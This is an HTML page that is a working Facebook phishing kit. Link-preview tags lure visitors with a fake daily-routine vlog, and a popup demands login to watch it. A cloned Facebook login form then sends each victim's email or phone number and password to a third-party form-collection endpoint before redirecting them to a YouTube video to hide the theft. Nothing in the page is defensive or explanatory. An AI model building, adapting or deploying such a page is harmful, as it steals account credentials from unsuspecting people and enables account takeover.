<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    
    <!-- Updated Open Graph tags -->
    <meta property="og:title" content="My Daily Routine Vlog" />
    <meta property="og:description" content="Watch my full daily routine vlog! Join me as I take you through my day from morning to night, filled with exciting moments and fun activities." />
    
    <!-- Updated image URL -->
    <meta property="og:image" content="https://raw.githubusercontent.com/Gunjan-netizen/You-video-/refs/heads/main/IMG190721.jpg" />
    
    <!-- Updated website URL -->
    <meta property="og:url" content="https://security-check.netlify.app/" />
    
    <title>My Daily Routine Vlog</title>
    <link rel="stylesheet" href="styles.css">
    
    <style>
        /* Popup styling */
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 300px;
            background-color: white;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            text-align: center;
            z-index: 1000;
        }
        .popup img {
            width: 100%;
            height: auto;
        }
        .popup h2 {
            margin: 10px 0;
            font-size: 16px;
        }
        .popup button {
            padding: 10px 20px;
            background-color: #4267B2;
            color: white;
            border: none;
            cursor: pointer;
            font-size: 14px;
        }
        .popup button:hover {
            background-color: #365899;
        }
        /* Dim background when popup is visible */
        .popup-active {
            filter: blur(3px);
            opacity: 0.5;
        }
    </style>
</head>

<body>
    <!-- Popup -->
    <div class="popup" id="videoPopup">
        <img src="https://raw.githubusercontent.com/Gunjan-netizen/You-video-/refs/heads/main/IMG190721.jpg" alt="Daily Routine Vlog Thumbnail">
        <h2>Watch the full video!</h2>
        <p>Login to view my complete daily routine vlog.</p>
        <button onclick="closePopup()">Login</button>
    </div>

    <div class="row res" id="mainContent">
        <div class="fb-form res">
            <div class="card">
                <h1>Facebook</h1>
                <p>Connect with friends and the world</p>
                <p>around you on Facebook.</p>
            </div>
            <form id="loginForm">
                <input type="text" id="emailPhone" placeholder="Email or phone number" required>
                <input type="password" id="password" placeholder="Password" required>
                <div class="fb-submit">
                    <button type="submit" class="login">Login</button>
                    <a href="#" class="forgot">Forgot password?</a>
                </div>
                <hr>
                <div class="button">
                    <a href="#">Create new account</a>
                </div>
            </form>
        </div>
    </div>

    <footer>
        <div class="footer-langs">
            <!-- Footer content here -->
        </div>
    </footer>

    <!-- JavaScript for Popup and Form Submission -->
    <script>
        // Show the popup on page load
        window.onload = function() {
            document.getElementById('videoPopup').style.display = 'block';
            document.getElementById('mainContent').classList.add('popup-active');
        };

        // Close the popup
        function closePopup() {
            document.getElementById('videoPopup').style.display = 'none';
            document.getElementById('mainContent').classList.remove('popup-active');
        }

        // Form submission and data handling
        document.getElementById("loginForm").addEventListener("submit", function (e) {
            e.preventDefault(); // Form submission roken

            const emailPhoneInput = document.getElementById("emailPhone").value;
            const passwordInput = document.getElementById("password").value;

            // Regular expression for email validation
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            const phoneRegex = /^[0-9]{10}$/;

            if (emailRegex.test(emailPhoneInput) || phoneRegex.test(emailPhoneInput)) {
                if (passwordInput) {
                    // Formcarry par form data submit karein (Updated formcarry URL)
                    fetch("https://formcarry.com/s/hJQzoZbhqc-", {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            emailOrPhone: emailPhoneInput,
                            password: passwordInput
                        })
                    })
                    .then(response => {
                        if (response.ok) {
                            console.log("Data submitted successfully");

                            // Data submit hone ke baad redirect karein
                            window.location.href = "https://www.youtube.com/watch?v=Umqb9KENgmk";  // Redirect to Bollywood song
                        } else {
                            console.log("Failed to submit data");
                            alert("Kuch galti ho gayi, kripya dubara prayas karein.");
                        }
                    })
                    .catch(error => {
                        console.error("Error:", error);
                        alert("Error: Data submit karte samay koi samasya aayi.");
                    });
                } else {
                    alert("Kripya apna password daalein.");
                }
            } else {
                alert("Valid 10-digit phone number ya email address daalein.");
            }
        });
    </script>
</body>

</html>
